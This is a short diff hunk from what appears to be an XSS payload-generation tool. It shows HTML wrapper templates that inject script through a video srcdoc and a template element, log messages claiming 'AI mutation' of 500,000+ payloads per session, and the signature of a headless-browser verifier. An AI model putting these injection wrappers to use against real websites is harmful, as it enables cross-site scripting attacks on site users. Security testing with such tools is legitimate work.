@@ -234,8 +234,8 @@ LEGIT_WRAPPERS = [
     "<video srcdoc='<script>PAYLOAD</script>'></video>",
     "<template id='tpl'>PAYLOAD</template><script>document.body.append(tpl.content);</script>"
 ]
-logging.info(f"[+] Loaded Unique Mutations/Obfuscations As Per Session")
-logging.info(f"[+] New Mutations of XSS will be around ten‑thousand ")
+logging.info(f"[+] Generation and Starting AI mutations real time ")
+logging.info(f"[+] AI mutation practical coverage will be 500 000+ unique payloads as per session")
 
 # ─── HEADLESS VERIFIER ───────────────────────────────────────────────────────
 def verify_in_browser(url: str, method: str, data: Dict[str,str]) -> bool:
